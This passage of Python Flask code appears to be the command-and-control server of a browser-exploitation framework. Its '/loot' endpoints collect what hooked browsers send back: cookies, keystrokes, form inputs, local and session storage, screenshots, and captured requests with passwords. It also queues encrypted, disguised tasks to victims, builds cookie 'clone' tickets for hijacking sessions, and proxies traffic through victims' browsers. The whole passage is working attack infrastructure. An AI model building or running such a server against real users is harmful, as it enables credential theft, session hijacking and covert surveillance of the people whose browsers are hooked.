    encoded = base64.b64encode(jsonStr.encode('utf-8')).decode('utf-8')
    newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0, code=encoded)
    db_session.add(newJob)
    dbCommit()

    return jsonify({"status": "activated", "pluginId": pluginId}), 200


@app.route('/api/plugins/<pluginId>/deactivate', methods=['POST'])
@login_required
def deactivatePlugin(pluginId):
    """Deactivate a plugin on a client."""
    content = request.json
    clientID = content.get('clientID')

    client = Client.query.filter_by(id=clientID).first()
    if not client:
        client = Client.query.filter_by(uuid=clientID).first()
    if not client:
        return "Client not found", 404

    existing = PluginActivation.query.filter_by(clientID=client.uuid, pluginId=pluginId).first()
    if existing:
        existing.active = False
        dbCommit()

    # Queue PLUGIN_UNLOAD task
    taskData = {
        "type": "PLUGIN_UNLOAD",
        "pluginId": pluginId
    }
    jsonStr = json.dumps(taskData)
    encoded = base64.b64encode(jsonStr.encode('utf-8')).decode('utf-8')
    newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0, code=encoded)
    db_session.add(newJob)
    dbCommit()

    return jsonify({"status": "deactivated", "pluginId": pluginId}), 200


@app.route('/api/plugins/client/<clientID>', methods=['GET'])
@login_required
def getClientPlugins(clientID):
    """List active plugins for a client."""
    client = Client.query.filter_by(id=clientID).first()
    if not client:
        client = Client.query.filter_by(uuid=clientID).first()
    if not client:
        return "Client not found", 404

    activations = PluginActivation.query.filter_by(clientID=client.uuid, active=True).all()
    result = []
    for act in activations:
        manifest = PLUGINS.get(act.pluginId, {}).get('manifest', {})
        result.append({
            'pluginId': act.pluginId,
            'settings': json.loads(act.settings) if act.settings else {},
            'activatedAt': act.activatedAt.isoformat() if act.activatedAt else None,
            'manifest': manifest
        })
    return jsonify(result)


@app.route('/api/plugins/<pluginId>/data/<clientID>', methods=['GET'])
@login_required
def getPluginData(pluginId, clientID):
    """Fetch plugin data for a client."""
    client = Client.query.filter_by(id=clientID).first()
    if not client:
        client = Client.query.filter_by(uuid=clientID).first()
    if not client:
        return "Client not found", 404

    dataType = request.args.get('dataType')
    limit = request.args.get('limit', 100, type=int)
    offset = request.args.get('offset', 0, type=int)

    query = PluginData.query.filter_by(clientID=client.uuid, pluginId=pluginId)
    if dataType:
        query = query.filter_by(dataType=dataType)
    query = query.order_by(PluginData.id.desc())
    total = query.count()
    rows = query.offset(offset).limit(limit).all()

    result = []
    for row in rows:
        result.append({
            'id': row.id,
            'dataType': row.dataType,
            'data': json.loads(row.data),
            'timeStamp': row.timeStamp.isoformat() if row.timeStamp else None
        })
    return jsonify({'total': total, 'rows': result})


@app.route('/api/plugins/<pluginId>/data/<clientID>', methods=['DELETE'])
@login_required
def deletePluginData(pluginId, clientID):
    """Clear plugin data for a client."""
    client = Client.query.filter_by(id=clientID).first()
    if not client:
        client = Client.query.filter_by(uuid=clientID).first()
    if not client:
        return "Client not found", 404

    PluginData.query.filter_by(clientID=client.uuid, pluginId=pluginId).delete()
    dbCommit()
    return jsonify({"status": "deleted"}), 200


@app.route('/api/plugins/eventData/<int:eventID>', methods=['GET'])
@login_required
def getPluginEventData(eventID):
    """Get PluginData row by ID (for event timeline detail view)."""
    row = PluginData.query.filter_by(id=eventID).first()
    if not row:
        return "Not found", 404
    return jsonify({
        'id': row.id,
        'pluginId': row.pluginId,
        'dataType': row.dataType,
        'data': json.loads(row.data),
        'timeStamp': row.timeStamp.isoformat() if row.timeStamp else None
    })


# For use by both normal requests and obfuscated requests
def createTaskResponse(identifier):
    client = Client.query.filter_by(uuid=identifier).first()

    # Make sure we run the repeat run scheduler
    scheduleRepeatTasks(client)

    dbChange = False

    payloads = ClientPayloadJob.query.filter_by(clientKey=client.id).order_by(ClientPayloadJob.id.asc()).all()


    taskedPayloads = [{'id':payload.id, 'data':payload.code} for payload in payloads]

    for payload in payloads:
        # logger.info("Payload found: " + str(payload.id))
        # only delete if it's repeatrun is set to no
        if payload.repeatrun == False:
            db_session.delete(payload)
            dbChange = True
    
    # Useful for UI feedback
    if payloads:
        if not client.hasJobs:
            dbChange = True
            client.hasJobs = True
    else:
        if client.hasJobs:
            dbChange = True
            client.hasJobs = False

    if dbChange:
        dbCommit()

    # is obfuscation/encryption enabled and ACTIVE on client?
    if client.sendKey != None and client.cryptoActive:
        iv             = os.urandom(12)
        aesgcm         = AESGCM(client.sendKey)
        jsonString     = json.dumps(taskedPayloads)
        plaintextBytes = jsonString.encode('utf-8')
        ciphertext     = aesgcm.encrypt(iv, plaintextBytes, None)

        encodedIv         = base64.b64encode(iv).decode('utf-8')
        encodedCiphertext = base64.b64encode(ciphertext).decode('utf-8')

        datapack = encodedIv + "," + encodedCiphertext

        encryptedResponse = {
            "metricData": datapack
        }

        return jsonify(encryptedResponse)
    else:
        # Normal not-encrypted/obfuscated response
        return jsonify(taskedPayloads)





# Check for custom payload jobs for the client
@app.route('/client/taskCheck/<identifier>', methods=['GET'])
def returnPayloads(identifier):
    if not isClientSessionValid(identifier):
        return "No.", 401

    return createTaskResponse(identifier)






# Helper to save screenshot data from either direct or proxied calls
def saveScreenshot(identifier, image, ip, userAgent):
    lootDir = findLootDirectory(identifier)
    
    # Use UUID for filename to prevent race conditions and collisions in dirty loot directories
    imageName = str(uuid.uuid4())

    #logger.info("Writing the file to disk...")
    file_path = os.path.join(dataDirectory, "lootFiles", lootDir, f"{imageName}_Screenshot.png")
    with open (file_path, "wb") as binary_file:
        binary_file.write(image)
        binary_file.close()

    # Put it in the DB
    newScreenshot = Screenshot(clientID=identifier, fileName="/lootFiles/" + lootDir + "/" + imageName + "_Screenshot.png")
    db_session.add(newScreenshot)

    clientSeen(identifier, ip, userAgent)
    db_session.execute(update(Client).where(Client.uuid == identifier).values(imageCounter=Client.imageCounter+1))
    dbCommit()

    # add to global event table
    db_session.refresh(newScreenshot)
    newEvent = Event(clientID=identifier, timeStamp=newScreenshot.timeStamp, 
    eventType='SCREENSHOT', eventID=newScreenshot.id)
    db_session.add(newEvent)
    dbCommit()


# Capture screenshot
@app.route('/loot/screenshot/<identifier>', methods=['POST'])
def recordScreenshot(identifier):
    if not isClientSessionValid(identifier):
        return "No.", 401

    image     = request.data
    file_type = magic.from_buffer(image, mime=True)

    if file_type != 'image/png':
        logger.error("!!!! Wrong screenshot filetype!")
        logger.error("---- Type: " + file_type)
        return "No.", 401

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    saveScreenshot(identifier, image, ip, request.headers.get('User-Agent'))

    return "ok", 200

    return "ok", 200



# save HTML content
def saveHTML(identifier, url, html, ip, userAgent):
    lootDir = findLootDirectory(identifier)

    # Use UUID for filename to prevent race conditions
    htmlName = str(uuid.uuid4())

    lootFile = dataDirectory + "lootFiles/" + lootDir + "/" + htmlName + "_htmlCopy.html"

    with open (lootFile, "w") as html_file:
        html_file.write(html)
        html_file.close()


    # Put it in the DB
    newHtml = HtmlCode(clientID=identifier, url=url,fileName = lootFile)
    db_session.add(newHtml)

    clientSeen(identifier, ip, userAgent)
    db_session.execute(update(Client).where(Client.uuid == identifier).values(htmlCodeCounter=Client.htmlCodeCounter+1))
    dbCommit()

    # add to global event table
    db_session.refresh(newHtml)
    newEvent = Event(clientID=identifier, timeStamp=newHtml.timeStamp, 
        eventType='HTML', eventID=newHtml.id)
    db_session.add(newEvent)
    dbCommit()




# Capture the HTML seen
@app.route('/loot/html/<identifier>', methods=['POST'])
def recordHTML(identifier):
    # logger.info("Got HTML from: " + identifier)

    if not isClientSessionValid(identifier):
        return "No.", 401

    content = request.json 
    url = content['url']
    trapHTML = content['html']

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr


    saveHTML(identifier, url, trapHTML, ip, request.headers.get('User-Agent'))


    return "ok", 200



# For both obfuscated and non-obfuscated traffic
def saveUrl(identifier, url, ip, userAgent):
    # Put it in the DB
    newUrl = UrlVisited(clientID=identifier, url=url)
    db_session.add(newUrl)

    # Update primary domain for client if not already set
    client = Client.query.filter_by(uuid=identifier).first()
    if client and not client.domain:
        from urllib.parse import urlparse
        parsed_url = urlparse(url)
        if parsed_url.hostname:
            client.domain = parsed_url.hostname
            db_session.add(client)

    clientSeen(identifier, ip, userAgent)
    dbCommit()


    # add to global event table
    db_session.refresh(newUrl)
    newEvent = Event(clientID=identifier, timeStamp=newUrl.timeStamp, 
        eventType='URLVISITED', eventID=newUrl.id)
    db_session.add(newEvent)
    dbCommit()





# Record new URL visited in trap
@app.route('/loot/location/<identifier>', methods=['POST'])
def recordUrl(identifier):
    # logger.info("New URL recorded from: " + identifier)
    if not isClientSessionValid(identifier):
        return "No.", 401

    content = request.json
    url = content['url']
    # logger.info("Got URL: " + url)


    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr


    saveUrl(identifier, url, ip, request.headers.get('User-Agent'))


    return "ok", 200



# For both obfuscated and non-obfuscated traffic
def saveInput(identifier, content, ip, userAgent):
    inputData = content
    inputName = inputData['inputName']
    inputValue = inputData['inputValue']

    # Put it in the DB
    newInput = UserInput(clientID=identifier, inputName=inputName, inputValue=inputValue)
    db_session.add(newInput)

    clientSeen(identifier, ip, userAgent)
    dbCommit()

    # add to global event table
    db_session.refresh(newInput)
    newEvent = Event(clientID=identifier, timeStamp=newInput.timeStamp, 
    eventType='USERINPUT', eventID=newInput.id)
    db_session.add(newEvent)
    dbCommit()    



# Record user inputs
@app.route('/loot/input/<identifier>', methods=['POST'])
def recordInput(identifier):
    # logger.info("New input recorded from: " + identifier)
    if not isClientSessionValid(identifier):
        return "No.", 401

    content = request.json

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    saveInput(identifier, content, ip, request.headers.get('User-Agent'))

    return "ok", 200



# For both obfuscated and non-obfuscated traffic
def saveCookie(identifier, cookieName, cookieValue, ip, userAgent):
    # Put it in the DB
    newCookie = Cookie(clientID=identifier, cookieName=cookieName, cookieValue=cookieValue)
    db_session.add(newCookie)

    clientSeen(identifier, ip, userAgent)
    dbCommit()

    # add to global event table
    db_session.refresh(newCookie)
    newEvent = Event(clientID=identifier, timeStamp=newCookie.timeStamp, 
        eventType='COOKIE', eventID=newCookie.id)
    db_session.add(newEvent)
    dbCommit()    




# Record whatever cookies we can get our hands on
# Note that any httpOnly flagged cookies we won't get
# which would probably include any session cookies. Probably. 
@app.route('/loot/dessert/<identifier>', methods=['POST'])
def recordCookie(identifier):
    # logger.info("New cookie recorded from: " + identifier)
    if not isClientSessionValid(identifier):
        return "No.", 401

    content     = request.json
    cookieName  = content['cookieName']
    cookieValue = content['cookieValue']
    # logger.info("Cookie name: " + content['cookieName'] + ", value: " + content['cookieValue'])


    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    saveCookie(identifier, cookieName, cookieValue, ip, request.headers.get('User-Agent'))

    return "ok", 200



# For both obfuscated and non-obfuscated traffic
def saveLocalStorage(identifier, localStorageKey, localStorageValue, ip, userAgent):
    # Put it in the DB
    newLocalStorage = LocalStorage(clientID=identifier, key=localStorageKey, value=localStorageValue)
    db_session.add(newLocalStorage)

    clientSeen(identifier, ip, userAgent)
    dbCommit()

    # add to global event table
    db_session.refresh(newLocalStorage)
    newEvent = Event(clientID=identifier, timeStamp=newLocalStorage.timeStamp, 
    eventType='LOCALSTORAGE', eventID=newLocalStorage.id)
    db_session.add(newEvent)
    dbCommit()    





# Record local storage data bits
@app.route('/loot/localstore/<identifier>', methods=['POST'])
def recordLocalStorageEntry(identifier):
    # logger.info("New localStorage data recorded from: " + identifier)
    if not isClientSessionValid(identifier):
        return "No.", 401


    content = request.json
    localStorageKey = content['key']
    localStorageValue = content['value']


    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr


    saveLocalStorage(identifier, localStorageKey, localStorageValue, ip, request.headers.get('User-Agent'))

    return "ok", 200



# For both obfuscated and non-obfuscated traffic
def saveSessionStorage(identifier, sessionStorageKey, sessionStorageValue, ip, userAgent):
    # Put it in the DB
    newSessionStorage = SessionStorage(clientID=identifier, key=sessionStorageKey, value=sessionStorageValue)
    db_session.add(newSessionStorage)

    clientSeen(identifier, ip, userAgent)
    dbCommit()

    # add to global event table
    db_session.refresh(newSessionStorage)
    newEvent  = Event(clientID=identifier, timeStamp=newSessionStorage.timeStamp,
    eventType ='SESSIONSTORAGE', eventID=newSessionStorage.id)
    db_session.add(newEvent)
    dbCommit()


def saveKeylog(identifier, keys, target, url, ip, userAgent):
    newKeylog = Keylog(clientID=identifier, keys=keys, target=target or '', url=url or '')
    db_session.add(newKeylog)
    clientSeen(identifier, ip, userAgent)
    dbCommit()

    db_session.refresh(newKeylog)
    newEvent = Event(clientID=identifier, timeStamp=newKeylog.timeStamp,
        eventType='KEYLOG', eventID=newKeylog.id)
    db_session.add(newEvent)
    dbCommit()




# Record session storage data bits
@app.route('/loot/sessionstore/<identifier>', methods=['POST'])
def recordSessionStorageEntry(identifier):
    # logger.info("New sessionStorage data recorded from: " + identifier)
    if not isClientSessionValid(identifier):
        return "No.", 401

    content = request.json
    sessionStorageKey   = content['key']
    sessionStorageValue = content['value']


    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr


    saveSessionStorage(identifier, sessionStorageKey, sessionStorageValue, ip, request.headers.get('User-Agent'))


    return "ok", 200


@app.route('/loot/keylog/<identifier>', methods=['POST'])
def recordKeylog(identifier):
    if not isClientSessionValid(identifier):
        return "No.", 401

    content = request.json

    if proxyMode:
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    saveKeylog(identifier, content.get('keys', ''), content.get('target', ''),
               content.get('url', ''), ip, request.headers.get('User-Agent'))

    return "ok", 200





# For both obfuscated and non-obfuscated traffic
def saveXhrDump(identifier, content, ip, userAgent):
    method         = content.get('method')
    url            = content.get('url')
    asyncRequest   = content.get('async', True)
    requestBody    = content.get('body')
    user           = content.get('user')
    password       = content.get('password')
    headers        = content.get('headers', {})
    responseBody   = content.get('responseBody')
    responseStatus = content.get('responseStatus')


    newXhrApiCall = XhrApiCall(clientID=identifier, method=method, url=url, asyncRequest=asyncRequest, user=user, password=password, requestBody=requestBody, responseBody=responseBody, responseStatus=responseStatus)
    db_session.add(newXhrApiCall)

    clientSeen(identifier, ip, request.headers.get('User-Agent'))
    dbCommit()

    # add to global event table
    db_session.refresh(newXhrApiCall)
    newEvent  = Event(clientID=identifier, timeStamp=newXhrApiCall.timeStamp, 
    eventType ='XHRAPICALL', eventID=newXhrApiCall.id)
    db_session.add(newEvent)

    for header, value in headers.items():
        newHeader = XhrHeader(apiCallID=newXhrApiCall.id, clientID=identifier, header=header, value=value)
        db_session.add(newHeader)

    dbCommit()    





# Dump the full XHR api call info
@app.route('/loot/xhrRequest/<identifier>', methods=['POST'])
def recordXhrDump(identifier):
    if not isClientSessionValid(identifier):
        return "No.", 401

    content = request.json

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    saveXhrDump(identifier, content, ip, request.headers.get('User-Agent'))

    return "ok", 200   




# For both obfuscated and non-obfuscated traffic
def saveFetchDump(identifier, content, ip, userAgent):
    method         = content.get('method')
    url            = content.get('url')
    requestBody    = content.get('body')
    headers        = content.get('headers', {})
    responseBody   = content.get('responseBody')
    responseStatus = content.get('responseStatus')

    newFetchApiCall = FetchApiCall(clientID=identifier, method=method, url=url, requestBody=requestBody, responseBody=responseBody, responseStatus=responseStatus)
    db_session.add(newFetchApiCall)

    clientSeen(identifier, ip, userAgent)
    dbCommit()

    # add to global event table
    db_session.refresh(newFetchApiCall)
    newEvent  = Event(clientID=identifier, timeStamp=newFetchApiCall.timeStamp, 
    eventType ='FETCHAPICALL', eventID=newFetchApiCall.id)
    db_session.add(newEvent)

    for header, value in headers.items():
        newHeader = FetchHeader(apiCallID=newFetchApiCall.id, clientID=identifier, header=header, value=value)
        db_session.add(newHeader)

    dbCommit()


def saveBeaconVisit(identifier, domain, url, ip, userAgent):
    # Check if domain already exists for this client
    existingDomain = BeaconDomain.query.filter_by(clientID=identifier, domain=domain).first()
    
    domainID = None
    if existingDomain:
        existingDomain.lastSeen = func.now()
        domainID = existingDomain.id
    else:
        # Race condition protection: try to insert, catch integrity error if another thread beat us
        try:
            with db_session.begin_nested():
                newDomain = BeaconDomain(clientID=identifier, domain=domain)
                db_session.add(newDomain)
            db_session.flush() # This is now safe as begin_nested handles the sub-transaction
            domainID = newDomain.id
        except IntegrityError:
            # Another thread inserted it, fetch it again
            existingDomain = BeaconDomain.query.filter_by(clientID=identifier, domain=domain).first()
            if existingDomain:
                existingDomain.lastSeen = func.now()
                domainID = existingDomain.id
    
    # Record the specific visit if URL provided and we have a valid domainID
    if domainID and url:
        # Deduplication: Don't record if it's the exact same URL as the very last visit for this domain
        # within the last 5 minutes (to handle telemetry heartbeats)
        lastVisit = BeaconVisit.query.filter_by(domainID=domainID).order_by(BeaconVisit.visitTime.desc()).first()
        
        shouldRecord = True
        if lastVisit and lastVisit.url == url:
            now = datetime.datetime.now(datetime.timezone.utc)
            
            lastVisitTime = lastVisit.visitTime
            if lastVisitTime.tzinfo is None:
                lastVisitTime = lastVisitTime.replace(tzinfo=datetime.timezone.utc)

            timeDiff = now.timestamp() - lastVisitTime.timestamp()
            if timeDiff < 300: # 5 minutes
                shouldRecord = False

        if shouldRecord:
            newVisit = BeaconVisit(domainID=domainID, url=url)
            db_session.add(newVisit)

    clientSeen(identifier, ip, userAgent)
    dbCommit()


def saveBeaconCapture(identifier, domain, captureType, name, value, ip, userAgent, url=None, extraData=None):
    # Ensure domain exists and record visit if URL is present
    saveBeaconVisit(identifier, domain, url, ip, userAgent)

    # Fetch domain object to get its ID for the capture link
    domainObj = BeaconDomain.query.filter_by(clientID=identifier, domain=domain).first()
    if domainObj:
        # Deduplication: Check for same capture in the last 10 minutes
        lastCapture = BeaconCapture.query.filter_by(
            domainID=domainObj.id,
            captureType=captureType,
            name=name,
            value=value
        ).order_by(BeaconCapture.capturedAt.desc()).first()

        shouldSave = True
        if lastCapture:
            now = datetime.datetime.now(datetime.timezone.utc)
            # Ensure lastCapture.capturedAt is timezone aware if now is
            lastCapturedAt = lastCapture.capturedAt
            if lastCapturedAt.tzinfo is None:
                lastCapturedAt = lastCapturedAt.replace(tzinfo=datetime.timezone.utc)

            timeDiff = now.timestamp() - lastCapturedAt.timestamp()
            if timeDiff < 600: # 10 minutes
                shouldSave = False

        if shouldSave:
            # Save the capture
            newCapture = BeaconCapture(domainID=domainObj.id, captureType=captureType, name=name, value=value, extraData=extraData)
            db_session.add(newCapture)
            dbCommit()
    
    
    # Dump the full Fetch api call info
@app.route('/loot/fetchRequest/<identifier>', methods=['POST'])
def recordFetchDump(identifier):
    if not isClientSessionValid(identifier):
        return "No.", 401

    content = request.json

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    saveFetchDump(identifier, content, ip, request.headers.get('User-Agent'))

    return "ok", 200   





# For both obfuscated and non-obfuscated traffic
def saveFormPost(identifier, content, ip, userAgent):
    formName    = content.get('name', None)
    formAction  = content.get('action', None)  # This may be base64 encoded
    formMethod  = content.get('method', None)
    formEncType = content.get('encType', None)
    formData    = content.get('data', None)   # Make sure this comes in base64 encoded
    url         = content.get('url', None)

    # Put it in the database
    newFormPost = FormPost(clientID=identifier, formName=formName, formAction=formAction, formMethod=formMethod, formEncType=formEncType, formData=formData, url=url)
    db_session.add(newFormPost)

    clientSeen(identifier, ip, request.headers.get('User-Agent'))
    dbCommit()

    # add to global event table
    db_session.refresh(newFormPost)
    newEvent  = Event(clientID=identifier, timeStamp=newFormPost.timeStamp, 
    eventType ='FORMPOST', eventID=newFormPost.id)
    db_session.add(newEvent)
    dbCommit()    





# Record Form Posts
@app.route('/loot/formPost/<identifier>', methods=['POST'])
def recordFormPost(identifier):
    if not isClientSessionValid(identifier):
        return "No.", 401

    # logger.info("## Recording Form Post")
    content = request.json

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    saveFormPost(identifier, content, ip, request.headers.get('User-Agent'))

    return "ok", 200





# For both obfuscated and non-obfuscated traffic
def saveCustomExfil(identifier, note, data, ip, userAgent):
    newExfil = CustomExfil(note=note, data=data)
    db_session.add(newExfil)

    clientSeen(identifier, ip, userAgent)
    dbCommit()

    # add to global event table
    db_session.refresh(newExfil)
    newEvent  = Event(clientID=identifier, timeStamp=newExfil.timeStamp, 
        eventType ='CUSTOMEXFIL', eventID=newExfil.id)
    db_session.add(newEvent)
    dbCommit()    



# Record custom exfiltration, allows custom payloads
# to send responses into client events for storage
@app.route('/loot/customData/<identifier>', methods=['POST'])
def recordCustomExfil(identifier):
    if not isClientSessionValid(identifier):
        return "No.", 401

    content = request.json

    note = content.get('note', None)
    data = content.get('data', None)

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    saveCustomExfil(identifier, note, data, ip, request.headers.get('User-Agent'))

    return "ok", 200






#***************************************************************************
# UI API Endpoints


# Get clients list
@app.route('/api/getClients', methods=['GET'])
@login_required
def getClients():
    clients = Client.query.all()

    allClients = []
    for client in clients:
        # Fallback for existing clients without the domain field set
        display_domain = client.domain
        if not display_domain and client.clientType != 'bex-beacon':
            latest_url = UrlVisited.query.filter_by(clientID=client.uuid).order_by(UrlVisited.timeStamp.desc()).first()
            if latest_url:
                from urllib.parse import urlparse
                parsed = urlparse(latest_url.url)
                display_domain = parsed.hostname

        allClients.append({
            'id': client.id,
            'uuid': client.uuid,
            'tag': client.tag,
            'clientType': client.clientType,
            'parentUUID': client.parentUUID if client.parentUUID else None,
            'domain': display_domain if display_domain else None,
            'nickname': client.nickname,
            'notes': client.notes,
            'firstSeen': client.firstSeen,
            'lastSeen': client.lastSeen,
            'ip': client.ipAddress,
            'platform': client.platform,
            'browser': client.browser,
            'isStarred': client.isStarred,
            'hasJobs': client.hasJobs,
            'fingerprint': client.fingerprint,
            'sidecarSupported': client.sidecarSupported,
            'sidecarConnected': client.sidecarConnected
        })

    return jsonify(allClients)




@app.route('/api/bex/domains/<id>', methods=['GET'])
@login_required
def getBexDomains(id):
    client = Client.query.filter_by(id=id).first()
    if not client:
        return jsonify([])
    
    domains = BeaconDomain.query.filter_by(clientID=client.uuid).all()
    domainData = []
    
    for d in domains:
        # Get visit count
        visitCount = BeaconVisit.query.filter_by(domainID=d.id).count()
        # Get last visited URL
        lastVisit = BeaconVisit.query.filter_by(domainID=d.id).order_by(BeaconVisit.visitTime.desc()).first()
        lastUrl = lastVisit.url if lastVisit else ""
        
        domainData.append({
            'id': d.id, 
            'domain': d.domain, 
            'firstSeen': d.firstSeen, 
            'lastSeen': d.lastSeen,
            'visitCount': visitCount,
            'lastUrl': lastUrl
        })

    return jsonify(domainData)


@app.route('/api/bex/visits/<domainID>', methods=['GET'])
@login_required
def getBexVisits(domainID):
    visits = BeaconVisit.query.filter_by(domainID=domainID).order_by(BeaconVisit.visitTime.desc()).limit(100).all()
    visitData = [{'id': v.id, 'url': v.url, 'visitTime': v.visitTime} for v in visits]
    return jsonify(visitData)


@app.route('/api/bex/captures/<domainID>', methods=['GET'])
@login_required
def getBexCaptures(domainID):
    captures = BeaconCapture.query.filter_by(domainID=domainID).all()
    captureData = [{'id': c.id, 'type': c.captureType, 'name': c.name, 'value': c.value, 'metadata': c.extraData, 'capturedAt': c.capturedAt} for c in captures]
    return jsonify(captureData)


@app.route('/api/bex/ticket/<domainID>', methods=['GET'])
@login_required
def getBexTicket(domainID):
    domain = BeaconDomain.query.filter_by(id=domainID).first()
    if not domain:
        return jsonify({'error': 'Domain not found'}), 404

    client = Client.query.filter_by(uuid=domain.clientID).first()
    if not client:
        return jsonify({'error': 'Client not found'}), 404

    # Get all captures for this domain
    captures = BeaconCapture.query.filter_by(domainID=domainID).order_by(BeaconCapture.capturedAt.desc()).all()

    # Deduplicate: keep most recent per (captureType, name)
    seen = set()
    deduped = []
    for c in captures:
        key = (c.captureType, c.name)
        if key not in seen:
            seen.add(key)
            deduped.append(c)

    cookies = []
    headers = []
    localStorage = []
    sessionStorage = []

    for c in deduped:
        if c.captureType == 'cookie':
            extra = {}
            if c.extraData:
                try:
                    extra = json.loads(c.extraData)
                except (json.JSONDecodeError, TypeError):
                    pass
            cookies.append({
                'name': c.name,
                'value': c.value,
                'httpOnly': extra.get('httpOnly', False),
                'secure': extra.get('secure', False),
                'sameSite': extra.get('sameSite', 'no_restriction'),
                'path': extra.get('path', '/'),
                'domain': extra.get('domain', domain.domain),
                'expirationDate': extra.get('expirationDate', None)
            })
        elif c.captureType == 'header':
            headers.append({
                'name': c.name,
                'value': c.value
            })
        elif c.captureType == 'local_storage':
            localStorage.append({
                'key': c.name,
                'value': c.value
            })
        elif c.captureType == 'session_storage':
            sessionStorage.append({
                'key': c.name,
                'value': c.value
            })

    # Get URLs from visits, deduplicated, most recent first
    visits = BeaconVisit.query.filter_by(domainID=domainID).order_by(BeaconVisit.visitTime.desc()).all()
    seenUrls = set()
    urls = []
    for v in visits:
        if v.url not in seenUrls:
            seenUrls.add(v.url)
            urls.append(v.url)

    ticket = {
        'version': 1,
        'type': 'clone',
        'generated': datetime.datetime.utcnow().isoformat() + 'Z',
        'domain': domain.domain,
        'userAgent': client.rawUserAgent or '',
        'platform': client.platform or '',
        'browser': client.browser or '',
        'cookies': cookies,
        'headers': headers,
        'localStorage': localStorage,
        'sessionStorage': sessionStorage,
        'urls': urls
    }

    return jsonify(ticket)


# ---------------------------------------------------------------------------
# Bex Proxy — WebSocket + management API
# ---------------------------------------------------------------------------
from proxy.server import (
    register_ws, unregister_ws, deliver_response,
    start_proxy_for_beacon, stop_proxy_for_beacon, stop_all_proxies,
    get_proxy_instance, get_all_proxy_instances, is_proxy_running_for,
    is_proxy_running, has_ws_connection,
    set_spoof_config, get_spoof_config,
)
from proxy.certs import CA_CERT_PATH


@sock.route('/ws/proxy/<session_uuid>')
def proxy_websocket(ws, session_uuid):
    """Persistent WebSocket for a beacon in proxy mode.
    The beacon connects here after receiving a PROXY_START task."""
    client = Client.query.filter_by(uuid=session_uuid).first()
    if not client:
        ws.close()
        return

    logger.info(f"Proxy WS: Beacon {session_uuid} connected")
    register_ws(session_uuid, ws.send)

    try:
        while True:
            msg = ws.receive(timeout=None)
            if msg is None:
                break
            try:
                data = json.loads(msg)
                msg_type = data.get('type')
                if msg_type == 'response':
                    req_id = data.get('id', '?')
                    status = data.get('status', '?')
                    logger.info(f"Proxy WS: Got response from beacon (req_id={req_id}, status={status})")
                    deliver_response(data.get('id'), data)
                elif msg_type == 'ping':
                    from proxy.server import _ws_send_lock
                    with _ws_send_lock:
                        ws.send(json.dumps({'type': 'pong'}))
                else:
                    logger.info(f"Proxy WS: Unknown message type '{msg_type}' from {session_uuid}: {str(msg)[:200]}")
            except json.JSONDecodeError:
                logger.warning(f"Proxy WS: Bad JSON from {session_uuid}: {str(msg)[:200]}")
    except Exception as e:
        logger.info(f"Proxy WS: Beacon {session_uuid} disconnected: {e}")
    finally:
        unregister_ws(session_uuid)
        logger.info(f"Proxy WS: Beacon {session_uuid} cleaned up")


@app.route('/api/proxy/start', methods=['POST'])
@login_required
def startProxy():
    content = request.json
    beaconID_raw = content.get('beaconID')

    client = Client.query.filter_by(id=beaconID_raw).first()
    if not client:
        client = Client.query.filter_by(uuid=beaconID_raw).first()
    if not client:
        return jsonify({'error': 'Client not found'}), 404

    beacon_uuid = client.uuid

    # Start (or return existing) proxy instance for this beacon
    inst = start_proxy_for_beacon(beacon_uuid)
    if not inst:
        return jsonify({'error': 'Failed to start proxy (no available ports)'}), 500

    # Queue a PROXY_START task for the beacon so it opens a WebSocket back to us
    taskData = {
        "type": "PROXY_START",
    }
    jsonStr = json.dumps(taskData)
    newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0,
                              code=base64.b64encode(jsonStr.encode('utf-8')).decode('utf-8'))
    db_session.add(newJob)
    dbCommit()

    logger.info(f"Proxy: Started for beacon {beacon_uuid} on port {inst.port}")
    return jsonify({
        'status': 'started',
        'port': inst.port,
        'beaconID': beacon_uuid,
        'authToken': inst.auth_token,
        'caCertPath': CA_CERT_PATH,
    })


@app.route('/api/proxy/stop', methods=['POST'])
@login_required
def stopProxy():
    content = request.json or {}
    beaconID_raw = content.get('beaconID')

    if not beaconID_raw:
        return jsonify({'error': 'beaconID required'}), 400

    client = Client.query.filter_by(id=beaconID_raw).first()
    if not client:
        client = Client.query.filter_by(uuid=beaconID_raw).first()
    if not client:
        return jsonify({'error': 'Client not found'}), 404

    beacon_uuid = client.uuid

    # Queue a PROXY_STOP task for the beacon
    taskData = {"type": "PROXY_STOP"}
    jsonStr = json.dumps(taskData)
    newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0,
                              code=base64.b64encode(jsonStr.encode('utf-8')).decode('utf-8'))
    db_session.add(newJob)
    dbCommit()

    stop_proxy_for_beacon(beacon_uuid)
    return jsonify({'status': 'stopped', 'beaconID': beacon_uuid})


@app.route('/api/proxy/status', methods=['GET'])
@login_required
def proxyStatus():
    beaconID_raw = request.args.get('beaconID')

    if beaconID_raw:
        # Status for a specific beacon
        client = Client.query.filter_by(id=beaconID_raw).first()
        if not client:
            client = Client.query.filter_by(uuid=beaconID_raw).first()
        if not client:
            return jsonify({'error': 'Client not found'}), 404

        beacon_uuid = client.uuid
        inst = get_proxy_instance(beacon_uuid)
        return jsonify({
            'running': inst is not None and inst.running,
            'beaconID': beacon_uuid,
            'port': inst.port if inst else None,
            'authToken': inst.auth_token if inst else None,
            'wsConnected': has_ws_connection(beacon_uuid),
            'spoofConfig': get_spoof_config(beacon_uuid),
        })
